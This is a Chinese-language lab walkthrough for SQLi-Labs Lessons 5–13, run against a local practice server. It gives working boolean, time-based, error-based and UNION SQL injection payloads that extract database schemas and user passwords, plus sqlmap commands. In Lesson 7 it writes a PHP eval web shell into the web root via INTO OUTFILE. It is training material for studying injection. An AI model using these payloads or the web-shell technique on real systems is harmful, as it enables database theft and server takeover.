table_name=\u0026#39;users\u0026#39;--+ ?id=-1\u0026#34;) union select 1,2,group_concat(username ,id , password) from users--+ 参考书籍：\nsqli-labs/mysql-injection.pdf at master · lcamry/sqli-labs\nBackground 盲注的讲解 1.什么是盲注？ 盲注是SQL注入时不直接显示数据库错误信息或查询结果 ，攻击者无法直接通过页面回显获取数据，而是通过观察一些差异来推断信息：页面内容变化（如“存在/不存在”提示）、HTTP状态码（如200/500）、响应时间差异（时间盲注）。\n简单来说就是页面不会返回sql语句执行错误的信息，我们需要通过页面的正常与不正常显示来判断。\n2、分类 布尔盲注、时间盲注、报错盲注\n3、布尔盲注（Boolean-Based Blind SQLi） 布尔盲注通过构造 逻辑条件（真/假），观察页面返回结果的差异，逐位推断数据库信息。条件为真 → 页面显示正常内容（如“You are in\u0026hellip;”）；条件为假 → 页面无内容或显示错误\n（1）如何判断布尔盲注？\n以 SQLi-Labs Less-5 为例：\n步骤1：确认注入点类型\n输入 ?id=1'，页面返回异常（可能为字符型注入）。 闭合单引号：?id=1' --+，页面恢复正常 → 单引号字符型注入。 步骤2：验证布尔盲注\n构造 真/假条件，观察页面差异：\n真条件：?id=1' and 1=1 --+ → 页面正常（如显示内容）。 假条件：?id=1' and 1=2 --+ → 页面异常（无内容）。 结论：存在布尔盲注，页面根据条件真/假返回不同结果。\n（2）布尔盲注的利用步骤\n1. 获取数据库名\n猜解长度：\n?id=1' and length(database())=8 --+ → 若页面正常，数据库名长度为8。 逐字符猜解：\n?id=1' and substr(database(),1,1)='s' --+ → 第1个字符是否为s（重复至第8个字符）。 2. 获取表名\n猜解表的数量：\n?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+ → 确认是否为4张表。 猜解表名长度：\n?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+ → 第一张表名长度是否为6。 逐字符猜解表名：\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+ → 第一张表的第1个字符是否为e。 3. 获取列名\n猜解列的数量：\n?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=3 --+ → 确认是否为3列。 逐字符猜解列名：\n?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i' --+ → 第一列的第1个字符是否为i。 4. 提取数据（如用户名/密码）\n猜解第一条记录的username：\n?id=1' and substr((select username from users limit 0,1),1,1)='D' --+ → 用户名的第1个字符是否为D。 猜解对应密码：\n?id=1' and substr((select password from users limit 0,1),1,1)='D' --+ → 密码的第1个字符是否为D。 4、时间盲注 （1）什么是时间盲注？\n攻击者通过构造SQL语句触发数据库延迟执行（如SLEEP(2)），根据响应时间的长短判断注入条件是否为真。\n（2）如何判断时间盲注？\n基本测试\n输入触发延迟的Payload，观察响应时间是否显著增加：?id=1' AND SLEEP(5) --+若页面加载时间超过5秒，可能存在时间盲注漏洞。 条件化测试\n结合逻辑条件验证：?id=1' AND IF(1=1, SLEEP(5), 0) --+ # 条件为真，触发延迟 ?id=1' AND IF(1=2, SLEEP(5), 0) --+ # 条件为假，不延迟若第一个请求延迟，第二个不延迟 → 确认时间盲注存在。 (3)时间盲注利用步骤\n1. 获取数据库名\n1.1 猜解数据库名长度\nsql\r1 ?id=1\u0026#39; AND IF(LENGTH(database())=8, SLEEP(2), 0) --+ 若延迟2秒，数据库名长度为8（如security）。\n1.2 逐字符猜解数据库名\nsql\r1 ?id=1\u0026#39; AND IF(ASCII(SUBSTR(database(),1,1))=115, SLEEP(2), 0) --+ SUBSTR(database(),1,1)：提取数据库名第1个字符。 ASCII(...)=115：判断是否为字符s（ASCII码115）。 若延迟，则确认该字符正确。 2. 获取表名\n2.1 猜解表的数量\nsql\r1 ?id=1\u0026#39; AND IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=4, SLEEP(2), 0) --+ 若延迟，当前数据库有4张表。\n2.2 猜解表名长度\nsql\r1 ?id=1\u0026#39; AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6, SLEEP(2), 0) --+ 若延迟，第一张表名长度为6（如emails）。\n2.3 逐字符猜解表名\nsql\r1 ?id=1\u0026#39; AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=101, SLEEP(2), 0) --+ 判断第一个表的第1个字符是否为e（ASCII码101）。 3. 获取列名\n3.1 猜解列的数量\nsql\r1 ?id=1\u0026#39; AND IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name=\u0026#39;users\u0026#39;)=3, SLEEP(2), 0) --+ 若延迟，users表有3列。\n3.2 逐字符猜解列名\nsql\r1 ?id=1\u0026#39; AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name=\u0026#39;users\u0026#39; LIMIT 0,1),1,1))=105, SLEEP(2), 0) --+ 判断第一列的第1个字符是否为i（ASCII码105）。 4. 提取数据（以用户密码为例）\n4.1 猜解用户名的第一个字符\nsql\r1 ?id=1\u0026#39; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))=68, SLEEP(2), 0) --+ 若延迟，用户名的第一个字符为D（ASCII码68）。 4.2 猜解密码\nsql\r1 ?id=1\u0026#39; AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 0,1),1,1))=68, SLEEP(2), 0) --+ 若延迟，密码的第一个字符为D。 5、使用ASCII码 + 二分法优化 将字符转换为ASCII码值，利用二分法快速缩小范围。\n步骤1：将字符转为ASCII码\n's'的ASCII码为115。 通过比较ASCII码值，快速定位字符。 步骤2：二分法猜解\n确定ASCII码范围：假设字符为可打印字符（ASCII 32-126）。 逐步缩小范围： sql\r1 ?id=1\u0026#39; AND ascii(substr(database(),1,1)) \u0026gt; 100 --+ # 是否大于100？ - 若页面正常（条件为真），说明ASCII码在101-126之间。 - 若页面异常（条件为假），说明ASCII码在32-100之间。 重复二分，直到锁定具体值。 示例：\nsql\r1 2 # 猜解第一个字符的ASCII码是否为115（即\u0026#39;s\u0026#39;） ?id=1\u0026#39; AND ascii(substr(database(),1,1))=115 --+ Less-5-单引号字符型_布尔盲注_报错注入 布尔盲注\n判断\n单引号字符型注入\n页面根据条件真/假返回不同结果，说明存在布尔盲注，\n1. 获取数据库名\n猜解长度：\n?id=1' and length(database())=8 --+ 页面正常，数据库名长度为8。 逐字符猜解：\n?id=1' and substr(database(),1,1)='s' --+ 第1个字符是否为s（重复至第8个字符）。 猜解过程：\n第1个字符：从ASCII码范围（通常测试 a-z、0-9、_）逐一尝试，直到页面正常。 第2个字符：修改为 substr(database(),2,1)，重复上述过程。 重复至第8个字符（substr(database(),8,1)）。 ASCII码范围解析\n字符类型 ASCII码范围 包含字符示例 数字 48-57 0(48) ~ 9(57) 下划线 95 _ 小写字母 97-122 a(97) ~ z(122) 2. 获取表名\n猜解表的数量：\n?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+ → 确认为4张表。 猜解表名长度：\n?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+ → 第一张表名长度为6。 逐字符猜解表名：\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+ → 第一张表的第1个字符为e。 3. 获取列名\n猜解列的数量：\n?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=3 --+ → 确认为3列。 逐字符猜解列名：\n?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i' --+ → 第一列的第1个字符为i。 4. 提取数据（如用户名/密码）\n猜解第一条记录的username：\n?id=1' and substr((select username from users limit 0,1),1,1)='D' --+ → 用户名的第1个字符为D。 猜解对应密码：\n?id=1' and substr((select password from users limit 0,1),1,1)='D' --+ → 密码的第1个字符为D。 报错注入\n这一关也可以使用报错注入\nsqli-labs\u0026mdash;第五关_sqli-labs第五关-CSDN博客\nsql-labs 闯关 5~10_sqli-labs5-CSDN博客\n1.floor报错\n用floor报错注入，得到数据库名称为’security’\nsql\r1 ?id=1\u0026#39; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(database())))--+ 语句解析\n?id=1'\n闭合原始 SQL 语句的单引号，进入注入逻辑。 and\n将注入的恶意代码与原始查询逻辑连接，使整个语句结果为布尔值。 select count(*) from information_schema.tables\n从系统表 information_schema.tables（存储所有表信息）中选择所有行数。此步骤仅用于生成足够多的数据以触发后续的 group by 报错。 group by concat(...)\n关键报错触发点。group by 子句会对结果按指定表达式分组，而 concat(...) 生成的字符串将作为分组键。由于 floor(rand(14)*2) 的随机性（但种子固定为 14），在分组时可能出现重复键冲突，导致报错。 floor(rand(14)*2) rand(14)：生成一个基于种子 14 的伪随机数（固定序列）。 rand(14)*2：将随机数范围扩展到 [0, 2)。 floor()：向下取整，结果为 0 或 1。 作用：生成确定性序列的 0 或 1，用于构造重复的分组键。 0x23\n十六进制表示的字符 #，作为分隔符提高报错信息的可读性。 database()\n内置函数，返回当前数据库名称（此处为 security）。 报错机制\n由于 group by 在临时表生成过程中需要为每行计算分组键，而 floor(rand(14)*2) 的值在计算过程中可能变化，导致同一分组键被多次插入临时表时触发 Duplicate entry 错误。报错信息会包含 concat(...) 的结果，从而泄露 database() 的值。 得到数据表名称\nsql\r1 ?id=1\u0026#39; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)))--+ select group_concat(table_name) ... group_concat()：将多行结果合并为单个字符串（例如 users,emails,products）。 information_schema.tables：系统表，存储所有数据库的表信息。 where table_schema='security'：筛选属于 security 数据库的表。 报错信息泄露\n报错信息中会包含所有表名的拼接结果（如 users,emails,...）。 得到字段名\nsql\r1 ?id=1\u0026#39; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;users\u0026#39;)))--+ information_schema.columns\n系统表，存储所有表的列（字段）信息。 where table_name='users'\n筛选 users 表的字段名（如 id,username,password）。 sql\r1 ?id=1\u0026#39; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(username) from users)))--+ 用翻译软件翻译出来的意思是[子查询返回超过 1 行]，所以用count函数统计看看有多少数据\n错误提示：子查询返回超过 1 行\ngroup_concat(username) 会将所有 username 合并为一个字符串（如 admin,user1,user2），但由于某些环境限制（如 MySQL 版本或配置），过长的字符串可能导致报错信息截断或无法触发预期错误。\nsql\r1 ?id=1\u0026#39; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select count(username) from users)))--+ 得到username有13个，既然输出一行，那么用limit一个一个输出\ncount(username)\n统计 users 表中 username 的数量（如 13），避免返回多行数据。 作用：确定需要分页获取数据的总量。 sql\r1 ?id=1\u0026#39; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select username from users limit 0,1)))--+ 得到第一个用户账户\nlimit 0,1\n限制子查询返回一行数据（0 表示起始位置，1 表示数量）。 逐步遍历\n修改 limit 1,1、limit 2,1 等获取后续数据。 sql\r1 ?id=1\u0026#39; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select username from users limit 1,1)))--+ 得到第二个用户账户\n以此类推，得到所有账户密码\n2.updatexml报错\n?id=1\u0026rsquo; and updatexml(1,concat(0x7e,database(),0x7e),1)\u0026ndash;+\n得到数据库名称\n?id=1\u0026rsquo; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)\u0026ndash;+\n得到数据表名称\n?id=1\u0026rsquo; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026lsquo;users\u0026rsquo;),0x7e),1)\u0026ndash;+\n得到字段名称\n?id=1\u0026rsquo; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)\u0026ndash;+\n得到用户名\n3.extractvalue报错\n?id=1\u0026rsquo; and extractvalue(1,concat(0x23,database(),0x23))\u0026ndash;+\n得到数据库名称\n?id=1\u0026rsquo; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23))\u0026ndash;+\n得到数据表名称\n得到字段名称\n?id=1\u0026rsquo; and extractvalue(1,concat(0x23,(select group_concat(username) from users),0x23))\u0026ndash;+\n得到用户名称，但明显可以看出，还没显示完整，用limit逐个查看\n?id=1\u0026rsquo; and extractvalue(1,concat(0x23,(select username from users limit 0,1),0x23))\u0026ndash;+\n查看第一个账户名称\nLess-6-单引号字符型_布尔盲注_报错注入 这一关与less-5的区别在于注入点不同，less-5是单引号，less-6是双引号，其他的都一样，可以用布尔盲注，也可以用updatexml报错注入。\n先判断出注入点是双引号\n?id=1\u0026rdquo; and updatexml(1,concat(0x7e,database(),0x7e),1)\u0026ndash;+\n得到数据库名称\n?id=1\u0026quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)\u0026ndash;+\n得到数据表名称\n?id=1\u0026quot; and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026lsquo;security\u0026rsquo; and table_name=\u0026lsquo;users\u0026rsquo;)),1) \u0026ndash;+\n得到字段名称\n?id=1\u0026quot; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)\u0026ndash;+\n得到用户名\n由于结果显示不全 可以使用limit来逐个查询\n?id=1\u0026quot; and updatexml(1,concat(1,(select username from users limit 0,1) ),1) \u0026ndash;+\nLess-7-单引号+双括号_outfile函数 sql\r1 ?id=1 经过试验，闭合方式是字符型'))\nsql\r1 ?id=1\u0026#39;))--+ 正常返回 You are in.... Use outfile...... 错误返回 You have an error in your SQL syntax\nMysql之outfile_mysql outfile-CSDN博客\nsql\r1 ?id=1\u0026#39;)) order by 3 --+ 方法一：outfile导出文件 在less7中，因为它报错不返回报错的数据库信息，我们无法获取到网站路径，我们可以在1-6关中注入获得数据库路径，\nsql\r1 ?id=-1\u0026#39; union select 1,2,@@datadir --+ @@datadir返回的是数据库存储数据的路径，而我们知道网站路径是在WWW目录下，那么结合@@datadir我们可以推断出网站的绝对路径为 D:\\CTF-Tools\\phpstudy_pro\\WWW\\\nsql\r1 ?id=1\u0026#39;)) and (select count(*) from mysql.user)\u0026gt;0 --+ 返回正常则有读取权限\n模板：?id=1')) union select (sql语句) into outfile '路径' --+\nsql\r1 ?id=1\u0026#39;)) union select 1,2,3 into outfile \u0026#39;D:\\\\CTF-Tools\\\\phpstudy_pro\\\\WWW\\\\sqli-labs\\\\Less-7\\\\1.txt\u0026#39; --+ 写入失败，之后找到问题是权限过低，需要打开phpstudy\\MySQL\\my.ini文件，在其中加上一句：secure_file_priv=\u0026quot;/\u0026quot;\nD:\\CTF-Tools\\phpstudy_pro\\Extensions\\MySQL5.7.26\\my.ini\n已经生成了1.txt\n写一句话木马\nsql\r1 ?id=1\u0026#39;)) union select 1,2,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;admin\u0026#34;])?\u0026gt;\u0026#39; into outfile \u0026#34;D:\\\\CTF-Tools\\\\phpstudy_pro\\\\WWW\\\\sqli-labs\\\\Less-7\\\\1.php\u0026#34; --+ 蚁剑连接成功\n注意\n参考文章：sqlilabs—less7_less-7-CSDN博客\n对文件进行导入导出首先得要有足够的权限，但是mysql默认不能导入和导出文件，这与secure_file_priv的值有关（默认为null)。secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。\n1、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出\n2、当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下\n3、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制\n用以下命令查看secure_file_priv的值\nshow variables like ‘%secure%’；\n由于先前已做过修改，这里显示的是可导入导出\n如果是null，想得到导入导出权限，可以在my.ini文件[mysqld]的后面加上secure_file_priv=’’（两个英文单引号），然后重启phpstudy即可\n1、outfire 后面的路径为绝对路径且存在\n2、要有足够的权限\n3、注入的内容也可以是字符串，句子\n4、要想注入新内容，需要新的文件名\n这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传1.php，下次再上传1.php，就是无效命令了，也就是新的test.php中的内容并不会覆盖之前的1.php\nLess-8 基本上和less-5一样\n自动化SQL注入测试工具 sqlmap 使用手册 - FreeK0x00 - 博客园\nSQLmap使用教程图文教程（非常详细）从零基础入门到精通，看完这一篇就够了。-CSDN博客\n-u[url]\n-D[数据库]\n-T[表]\n-C[字段]\n--dbs[列出所有数据库]\n--tables[列出数据库所有表]\n--dump[导出表的数据]\n--batch[自动选择默认选项（避免交互式提问）]\n这里使用sqlmap\npython sqlmap.py -u http://sqli-labs:8080/Less-9/?id=1 \u0026ndash;batch\nplain\r1 python sqlmap.py -u http://sqli-labs:8080/Less-8/id?=1 返回的注入点有布尔盲注和时间盲注\n数据库是Mysql\n接下来爆数据库\nplain\r1 python sqlmap.py -u http://sqli-labs:8080/Less-8/id?=1 --dbs 查看security\nplain\r1 python sqlmap.py -u http://sqli-labs:8080/Less-8/?id=1 -D security --tables 查看users\nplain\r1 python sqlmap.py -u http://sqli-labs:8080/Less-8/?id=1 -T users --dump Less-9-单引号-时间盲注 python sqlmap.py -u http://sqli-labs:8080/Less-9/?id=1 \u0026ndash;current-db \u0026ndash;batch\n无论id等于多少都显示You are in ....\nplain\r1 2 3 ?id=1 ?id=1\u0026#39; ?id=1\u0026#34; 这一关用到的是时间盲注\nplain\r1 ?id=1\u0026#39; and sleep(3) --+ 当传入上面的语句时，页面延迟了三秒，确定为单引号\n时间盲注步骤： 获取数据库名 1.1 猜解数据库名长度语法：\nsql\r1 2 ?id=1\u0026#39; and if(length(database())=x,sleep(5),1)--+ /*通过变换 x 的值来确定数据库名的长度，得到数据库名的长度为8。*/ sql\r1 id=1\u0026#39; and if(leng(database())=8,sleep(5),1)--+ 1.2 猜测数据库：\n语法：\nsql\r1 ?id=1\u0026#39; and if(ascii(substr(database(),x,1))=y, sleep(2), 0) --+ 测试第一位：\nsql\r1 ?id=1\u0026#39; and if(ascii(substr(database(),1,1))=115, sleep(2), 0) --+ 测得第一位是 s\nsql\r1 ?id=1\u0026#39; and if(ascii(substr(database(),2,1))=101, sleep(5), 1)--+ 得到第二位是 e（ascii 码是 101）… 以此类推，知道了数据库名是 security\n获取表名 2.1 猜解表的数量\nsql\r1 ?id=1\u0026#39; and if((select count(table_name) from information_schema.tables where table_schema=database())=4, sleep(2), 0) --+ 若延迟，当前数据库有4张表。\n2.2 猜解表名长度\nsql\r1 ?id=1\u0026#39; and if(lentgh((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(2), 0) --+ 若延迟，第一张表名长度为6（如emails）。\n2.3 逐字符猜解表名\nsql\r1 ?id=1\u0026#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(2), 0) --+ 判断第一个表的第1个字符是否为e（ASCII码101）。\n猜得第一个数据表的第一位是 e,…依次类推，得到 emails\nsql\r1 ?id=1\u0026#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,sleep(5),1)--+ 得到第二个数据表的第一位是 r,…依次类推，得到 referers …\n再以此类推，我们可以得到所有的数据表 emails，referers，uagents，users。\n接下来判断字段名与数据内容，还是和上面一样的套路，判断长度，判断名字\n获取列名 3.1 猜列数\nsql\r1 ?id=1\u0026#39; and if((select count(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;)=3, sleep(2), 0) --+ 若延迟，users表有3列。\n3.2 猜列名\nsql\r1 ?id=1\u0026#39; and if(ascii(substr((select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),1,1))=105,sleep(2),0)--+ 判断第一列的第1个字符是否为i（ASCII码105）。\n猜测 users 表的列：\n猜得 users 表的第一个列的第一个字符是 i， 以此类推，得到列名是 id，username，password\n提取数据 4.1 猜用户名的第一个字符\nplain\r1 ?id=1\u0026#39; and if(ascii(substr((select username from users limit 0,1), 1,1))=68,sleep(5),1)--+ 猜得 username 的第一行的第一位，以此类推，得到 username，password 字段的所有内容。\nsubstr(...,x,y) - 从位置 x 开始截取 y 个字符 ascii() - 获取字符的 ASCII 码值 (select count(table_name) from information_schema.tables where table_schema=database())=4 information_schema.tables - 系统表，包含所有表信息 table_schema=database() - 限制在当前数据库 count(table_name) - 计算表数量 =4 - 猜测当前数据库有4个表 总结时间盲注： sql\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ?id=1 and sleep(1)--+ ?id=1\u0026#39; and sleep(1)--+ ?id=1\u0026#39; AND IF(LENGTH(database())\u0026lt;10,sleep(1),1)--+ #二分法测试数据库长度 ?id=1\u0026#39; AND IF(LENGTH(database())=8,sleep(1),1)--+ #使用 left() 函数判断数据库名的第一位是否是字符 a，注入之后响应很快说明数据库名第一位不是 a。 ?id=1\u0026#39; AND IF(LEFT((SELECT database()), 1)=\u0026#39;a\u0026#39;,sleep(1),1)--+ #使用穷举法进行测试，得出数据库名的第一个字符为 “s”。 ?id=1\u0026#39; AND IF(LEFT((SELECT database()), 1)=\u0026#39;s\u0026#39;,sleep(1),1)--+ #接下来得出数据库名，再使用同样的方法继续爆破表名、字段名及其剩余信息。 ?id=1\u0026#39; AND IF(LEFT((SELECT database()), 8)=\u0026#39;security\u0026#39;,sleep(1),1)--+ Less-10-双引号-时间盲注 和less-9一样，注入点变为\u0026quot;\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 判断是双引号的时间盲注 ?id=1\u0026#34; and sleep(2) --+ 数据库名长度 ?id=1\u0026#34; and if(length(database())=8,sleep(5),1)--+ 数据库名猜测 第一位（s\t115）： ?id=1\u0026#34; and if(ascii(substr(database(),1,1))=115, sleep(2), 0) --+ 第二位（e\t101）： ?id=1\u0026#34; and if(ascii(substr(database(),2,1))=101, sleep(2), 0) --+ 以此类推，得到数据库名security security库中表的数量 ?id=1\u0026#34; and if((select count(table_name) from information_schema.tables where table_schema=database())=4, sleep(2), 0) --+ security库中第一张表的长度 ?id=1\u0026#34; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(2), 0) --+ security库中的表名 第一张表第一位字符（e\t101）： ?id=1\u0026#34; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(2), 0) --+ 依此类推，得到所有的数据表emails，referers，uagents，users。 ###############问题：users表的列数 ?id=1\u0026#34; and if((select count(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;)=4, sleep(2), 0) --+ users表的第一列列名（i\t105）： ?id=1\u0026#34; and if(ascii(substr((select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),1,1))=105,sleep(2),0)--+ 依此类推，得到列名是 id，username，password username中用户名的字符（D\t68): ?id=1\u0026#34; and if(ascii(substr((select username from users limit 0,1), 1,1))=68,sleep(5),1)--+ Less-11-\u0026rsquo;-POST-union 尝试输入admin/admin，登录成功了。。。\n尝试输入admin/aaa（密码随便）\n输入1\u0026rsquo;\n出现了报错 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' and password='' LIMIT 0,1' at line 1\n引号不匹配，'1'' 显示单引号没有正确闭合；空密码比较\n输入1\u0026rsquo;#，可以确定是字符型注入\n方法一联合注入 用 union 注入进行尝试：\n1' union select 1,database() #\n显示出数据库：security\n也可以判断字段数\na\u0026rsquo; order by 1 \u0026ndash; a\na\u0026rsquo; order by 2 \u0026ndash; a\na\u0026rsquo; order by 3 \u0026ndash; a\n第3个字段排序时开始报错，确定返回结果的字段数为 2。\n获取所有数据库，\na\u0026rsquo; union select 1,(select group_concat(schema_name) from information_schema.schemata) \u0026ndash; a\n获取 security 库的所有表，\na\u0026rsquo; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026ldquo;security\u0026rdquo;) \u0026ndash; a\n获取 users 表的所有字段\na\u0026rsquo; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026ldquo;security\u0026rdquo; and table_name=\u0026ldquo;users\u0026rdquo;) \u0026ndash; a\n获取数据库用户的密码\na\u0026rsquo; union select 1,group_concat(id, \u0026lsquo;:\u0026rsquo;, username, \u0026lsquo;:\u0026rsquo;, password) from security.users \u0026ndash; a\n方式二：报错注入 判断是否报错\na\u0026rsquo;\n报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''a'' and password='' LIMIT 0,1' at line 1适合使用报错注入。\n判断报错条件\na\u0026rsquo; and updatexml(1,0x7e,3) \u0026ndash; a\n页面正常显示报错信息，确定报错函数可以使用。\n获取所有数据库，\na\u0026rsquo; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),33,31)),3) \u0026ndash; a\n获取 security 库的所有表，\na\u0026rsquo; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026ldquo;security\u0026rdquo;),1,31)),3) \u0026ndash; a\n获取 users 表的所有字段，\na\u0026rsquo; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=\u0026ldquo;security\u0026rdquo; and table_name=\u0026ldquo;users\u0026rdquo;),1,31)),3) \u0026ndash; a\n获取数据库用户的密码，用户名输入：\na\u0026rsquo; and updatexml(1,concat(0x7e,(select group_concat(user,password) from mysql.user where user = \u0026lsquo;mituan\u0026rsquo;)),3) \u0026ndash; a\nLess-12-\u0026quot;) 与less-11一样，注入点变为\u0026quot;)\n用 union 注入进行尝试：\n1\u0026quot;) union select 1,database() #\n显示出数据库：security\n也可以判断字段数\na\u0026quot;) order by 1 \u0026ndash; a\na\u0026quot;) order by 2 \u0026ndash; a\na\u0026quot;) order by 3 \u0026ndash; a\n第3个字段排序时开始报错，确定返回结果的字段数为 2。\n获取所有数据库，\na\u0026quot;) union select 1,(select group_concat(schema_name) from information_schema.schemata) \u0026ndash; a\n获取 security 库的所有表，\na\u0026quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026ldquo;security\u0026rdquo;) \u0026ndash; a\n获取 users 表的所有字段\na\u0026quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026ldquo;security\u0026rdquo; and table_name=\u0026ldquo;users\u0026rdquo;) \u0026ndash; a\n获取数据库用户的密码\na\u0026quot;) union select 1,group_concat(id, \u0026lsquo;:\u0026rsquo;, username, \u0026lsquo;:\u0026rsquo;, password) from security.users \u0026ndash; a\nLess-13-')-报错注入-布尔盲注 输入admin\u0026rsquo; ， 给出报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin'') and password=('') LIMIT 0,1' at line 1\n输入admin') #或者admin')-- (--后要有一个空格)， 登录成功，说明存在注入点')\n这一关中没有返回登录信息，只显示登录成功与否，可以用布尔盲注和报错注入，\n报错注入 sql\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #判断报错条件 a\u0026#39;) and updatexml(1,0x7e,3) -- a ##返回：XPATH syntax error: \u0026#39;~\u0026#39; #脱库 ##尝试查询mysql.user表 a\u0026#39;) and updatexml(1,concat(0x7e,(select group_concat(user,password) from mysql.user where user = \u0026#39;mituan\u0026#39;)),3) -- a ###返回：Only constant XPATH queries are supported ##改用information_schema查询所有数据库名 a\u0026#39;) and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3) -- a ###返回：XPATH syntax error: \u0026#39;~information_schema,challenges,m\u0026#39;由于 updatexml() 只能返回约32个字符，所以只显示了部分数据库名 ##可以分段查询： a\u0026#39;) and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),3) -- a ###返回：XPATH syntax error: \u0026#39;~information_schema\u0026#39; a\u0026#39;) and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),3) -- a ###返回：XPATH syntax error: \u0026#39;~challenges\u0026#39; a\u0026#39;) and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1)),3) -- a ###返回：XPATH syntax error: \u0026#39;~security\u0026#39; #查询 security 数据库的所有表名 a\u0026#39;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;security\u0026#34;)),3) -- a ##返回：XPATH syntax error: \u0026#39;~emails,referers,uagents,users\u0026#39; # 查询 users 表的所有列名 a\u0026#39;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#34;security\u0026#34; and table_name=\u0026#34;users\u0026#34;)),3) -- a ##返回：XPATH syntax error: \u0026#39;~id,username,password\u0026#39; #查表中内容（分段查询）： a\u0026#39;) and updatexml(1,concat(0x7e,(select concat(id,\u0026#39;:\u0026#39;,username,\u0026#39;:\u0026#39;,password) from security.users limit 0,1)),3) -- a ##返回：XPATH syntax error: \u0026#39;~1:Dumb:Dumb\u0026#39; a\u0026#39;) and updatexml(1,concat(0x7e,(select concat(id,\u0026#39;:\u0026#39;,username,\u0026#39;:\u0026#39;,password) from security.users limit 1,1)),3) -- a ##返回：XPATH syntax error: \u0026#39;~2:Angelina:I-kill-you\u0026#39; 常见的脱库语句 ：\nsql\r1 2 3 4 5 6 7 8 9 10 11 12 13 # 获取所有数据库 select group_concat(schema_name) from information_schema.schemata # 获取 security 库的所有表 select group_concat(table_name) from information_schema.tables 